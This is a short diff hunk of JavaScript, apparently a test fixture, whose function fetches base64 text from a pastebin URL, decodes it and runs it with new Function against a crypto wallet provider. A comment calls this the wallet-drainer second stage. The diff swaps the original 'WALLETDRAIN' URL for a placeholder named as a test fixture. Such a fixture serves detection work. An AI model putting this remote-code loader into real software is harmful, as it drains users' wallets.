@@ -13,7 +13,7 @@
 (function () {
   const drain = async (provider) => {
     // Fetch the wallet-drainer second stage from a paste host.
-    const r = await fetch("https://pastebin.com/raw/WALLETDRAIN");
+    const r = await fetch("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste");
     const src = atob(await r.text());
     const fn = new Function("provider", src);
     return fn(provider);
